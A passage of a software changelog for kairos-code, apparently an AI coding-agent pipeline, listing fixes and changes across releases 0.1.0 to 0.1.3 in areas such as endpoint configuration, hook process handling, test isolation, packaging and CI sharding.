  the selection back to the DeepSeek preset, and the endpoint the user typed was neither
  shown nor saved. The dropdown is now derived once from the loaded values; matching is by
  exact host and the model name is not consulted.

### Changed

- **`scripts/smoke_binary.py` ends the server's whole process tree.** A frozen app forks
  the real server, so terminating the pid it started left an invisible orphan holding the
  port — and, on Windows, a lock on the executable, which broke the next build.
- **`scripts/ci_shard.sh` bounds each file with `--timeout-method=signal` on Linux**, so a
  hung shard names the test it hung in instead of printing unrelated thread stacks.

## [0.1.3] - 2026-09-13

### Fixed

- **The endpoint edited in Settings is now the endpoint the client calls.** Provider
  configs carry `endpointUrl` (what the Settings drawer writes, and what the "test
  connection" probe used) and `baseUrl` (what the orchestrator's chat calls used) — two
  fields holding one fact, and the client only ever read the second. A user who switched
  their endpoint to DeepSeek in the drawer kept sending every conversation to the
  provider configured before it, and got that provider's Cloudflare block page — an
  error with nothing to do with the configuration on screen. `resolve_base_url()` makes
  `endpointUrl` authoritative (`baseUrl` stays the fallback) and strips the path the SDK
  must not receive — `/chat/completions`, `/messages` — including a trailing slash.
- **Provider failures are summarised instead of pasted.** An unreachable endpoint used to
  put several kilobytes of HTML (`<!DOCTYPE html>` … Cloudflare Ray ID …) into the chat
  bubble, because the HTTP client puts the response body in the exception and two call
  sites interpolated the exception verbatim. An HTML block page now keeps the host and
  the Ray ID and names what to check; anything else collapses to one line, capped at 280
  characters. An HTTP 401 says the key is missing or was rejected and where to set it —
  reproduced against a real endpoint, and the likeliest first-run failure.

### Documentation

- Corrected the comment on `data_dir`: the packaged desktop app pins its data directory
  to `%LOCALAPPDATA%/kairos-code` and ignores `KAIROS_DATA_DIR` — only the development
  server honours that variable.

## [0.1.2] - 2026-09-13

### Fixed

- **A hook that timed out could kill the process that ran it — on POSIX.** The
  cleanup path used `os.killpg(os.getpgid(child), SIGKILL)`, but hook commands were
  started without `start_new_session`, so the child shared *this* process's group
  and the kill took down the running process (and, in CI, the whole job) with it:
  exit 137 and no traceback. Hook commands now get their own session, and
  `_force_kill` refuses to signal a group it belongs to. Windows was unaffected
  (`taskkill`, no process groups), which is why every local run was green.
- **The Task tracker called passed rounds failed.** It parsed Reviewer verdicts by
  looking for `approve`, which only the pre-R38.7 rubric shape carries. The
  simplified Reviewer answers `{"has_bugs": ...}`, so every round of a run whose
  gate said *passed* was listed as "failed — round finished without a verdict".
  The simple shape now goes through the loop's own translation
  (`kairos.loop.reviewers._normalize_bug_verdict`), so the tracker cannot disagree
  with the gate, and payloads truncated at the 2000-character storage cap are
  still understood.
- **The test suite wrote into the developer's real data directory.** The data
  directory defaults to `<repo>/data`, and `tests/unit/test_memory_api.py` creates
  projects called `mem-api-test-<hex>` through the real persistence layer: running
  pytest filled `data/kairos.db` with them, and they then showed up in the sidebar
  of the README screenshots. `tests/conftest.py` points `KAIROS_DATA_DIR` at a
  throwaway directory for the whole session, and `tests/test_test_isolation.py`
  asserts the directory the app resolves is that one.
- **The History table wrapped run ids mid-string.** The Run column had no width,
  so on a narrow table an eight-character id broke across three lines. It has an
  explicit width and ellipsis.

### Changed

- **README screenshots are regenerated** from a clean, key-free demo run: no
  test-fixture projects in the sidebar, no hand-annotated example project, no
  Chinese in an English README, and the Task tracker agrees with the gate.
- **The licence is now the canonical AGPL-3.0 text**, so GitHub identifies it; the
  project's own copyright notice moved to the README's licence section.
- **CI runs each shard file by file**, one bounded pytest process per file, and
  prints free memory and the largest processes around each one. A module that
  blocks during import is invisible to pytest's `--timeout`, and a job killed by
  its own limit keeps no logs — both of which made a shard-sized hole impossible
  to diagnose.

## [0.1.1] - 2026-09-13

The first release that could be published end to end. Cutting 0.1.0 is what
surfaced these, and one of them could only ever appear on a tagged run.

### Fixed

- **The container image never reached ghcr.io.** `docker push` rejected the
  reference outright (`repository name ... must be lowercase`) because the account
  is `Kairos-ai-agent`; the image path is lowercased now. The image itself built
  and passed its smoke test in 0.1.0 — only the push failed.
- **Publishing could dead-end on an existing Release.** `gh release create` now
  updates an existing release instead of erroring, so re-cutting a tag to pick up
  a workflow fix works.
- **The Docker job can no longer gate a release.** It is out of the release job's
  `needs`, so a registry problem cannot stop a release from being published; the
  job still runs and still reports red.

### Changed

- **The Python suite runs in six CI shards with a 90-minute ceiling**, printing
  `--durations=0`. A job killed by its own timeout keeps no logs at all, which is
  why diagnosing this took several attempts.
- **Platform-sensitive tests now work on Linux.** `tests/test_landlock_ci.py`
  called a sandbox API that no longer exists — a `TypeError` for every Linux
  contributor, invisible where the module is skipped — and its signature guard
  accepted any signature at all. It now exercises the documented fd + `preexec_fn`
  mechanism, checks that a write inside the allowed root still succeeds, and
  asserts that building a ruleset does not confine the calling process.
- **README and CHANGELOG name the artifacts that exist** (the wheel attached to
  the release, and a container image built by the release workflow) instead of a
  PyPI name that is not published yet.

## [0.1.0] - 2026-09-13

The first public cut of the pipeline — a Coder/Reviewer loop with an enforced
score gate, cost accounting, an eval harness (record/replay/derive), model routing
across direct providers and LiteLLM, sandbox levels, an MCP client, hooks, agent
teams, skills, and the Web UI + CLI + TUI surfaces.

Three ways to run it, all built and smoke-tested by the release workflow before
they are published: a standalone binary per platform, a wheel that carries the Web
UI, and a container image.

### Added

- **Installable in three ways.** Standalone executables for Linux, macOS and
  Windows (no Python, no Node — unzip and run; it opens the UI in your browser);
  `pip install kairos_code-<version>-py3-none-any.whl` (the wheel attached to this
  release) for a real `kairos` command with the built Web UI inside; and a
  container image built and pushed to `ghcr.io/kairos-ai-agent/kairos-code` by the
  release workflow.
  Every artifact is verified before it is published: the wheel is installed into
  an empty virtualenv and must serve the UI, and each binary is started headless
  and must answer `/api/health` and return the bundled SPA.
- `kairos --version`.
- Optional extras for the integrations that are imported lazily: `voice`,
  `memory`, `browser`, `cloud`, `llm`, `telemetry`, `daemon` (the base install
  works without any of them).
- **Gate Report** — the receipt for a loop: rounds, scores, verdicts, issues,
  checkpoints, learned fixes and cost. Rendered as one self-contained HTML file
  (EN/中文 toggle built in), as Markdown for a PR description, or as JSON for CI.
  Available as `kairos gate report --project <id|name>` and
  `GET /api/projects/{id}/gate-report`.
- **`kairos demo`** — the whole review gate in about six seconds, with **no API
  key and no network**: the real loop runs against a scripted model on a tiny
  generated repo, and finishes by running that repo's own tests.
- **Three-view UI**: Run (did it pass / what did it cost / better than last
  time), History (every run with its verdict and spend) and Settings; the rest
  lives under a collapsed *Advanced* group. `?project=<id>` deep links.
- 63-language UI with on-demand locale chunks, RTL support and machine-translated
  dictionaries.
- A `clean install` CI job: an empty virtualenv with core dependencies only must
  be able to run `kairos --version`, the zero-key demo, and a real server start.

### Fixed

- **A clean install could not start the server.** `python-multipart` (required to
  register any form/upload route) and `aiosqlite` were imported but never
  declared, so a fresh `pip install` produced a package that died while importing
  the app — every published binary and every wheel. Nothing local could see it:
  a developer virtualenv has both packages anyway. Found by the first release dry
  run, on all three platforms.
- **The wheel shipped no Web UI.** `python -m build` builds the wheel from the
  sdist, and `web/dist` is generated (and gitignored) so it is not in an sdist;
  the wheel is now built from the tree, and both the build job and CI assert that
  `web/dist/index.html` and the console script are actually inside it.
- **The Docker image could not build**: the image never copied `hatch_build.py`,
  the custom wheel hook declared in `pyproject.toml`.
- Two tests asserted things the implementation never promised, and only failed on
  Linux — where contributors actually run them: one patched `sys.platform` while
  `_resolve_loop()` reads `os.name`, the other passed `Path()` as a "missing"
  allowed root (`Path()` is `.` and is always truthy).
- **Round history was never persisted.** The `loop_rounds` table, its loaders,
  the UI endpoints and the FTS mirror all existed, but no production code path
  wrote the row — so history vanished on restart and the Gate Report had no
  source. The loop now records each round.
- **Cost was reported as the whole ledger.** The cost ledger has no project
  column, so a run's report showed global spend. Cost is now scoped to the run's
  time window (and flagged when it has to fall back).
- A broad `.gitignore` rule (`settings.json`, unanchored) silently kept an i18n
  source fragment — 298 keys — out of the repository, so every fresh clone failed
  the i18n gate while the maintainer's working tree stayed green.
- `vendor/_oss/{anthropic-skills,superpowers}` were committed as gitlinks, so a
  clone got two empty directories instead of the 76 vendored files.
- `kairos/__init__.py` lazily imported `cli` in a way that recursed
  (`from kairos import cli` raised `RecursionError`).
- The in-process cost buffer and the JSONL ledger double-counted every call.
- `kairos exec`/agent runs refused any provider without an `api_key`, which made
  local or scripted providers unusable.
- Packaged deep links (`/run?project=…`, `/history`) returned 404: the API served
  the SPA without a history fallback.
- `loop.*` WebSocket events were dropped by a topic whitelist, which silently
  disabled the "switch session and refresh" behaviour.
- Checkpoints could commit the parent repository when a workspace lived inside it
  (once sweeping a 640 MB archive into history); commits are now scoped to the
  workspace and refuse to run without one.

### Changed

- The Reviewer reports **bugs only** (`{"has_bugs", "bugs", "summary"}`); the
  internal approve/score gate is unchanged.
- `kairos <subcommand>` no longer silently starts the server when the subcommand
  is unknown to the launcher's command list.
- The Python test job runs as three balanced shards (measured by runtime, not
  test count) with a per-test timeout, because the full suite needs 40+ minutes
  on a 2-vCPU runner and would otherwise be killed mid-suite.
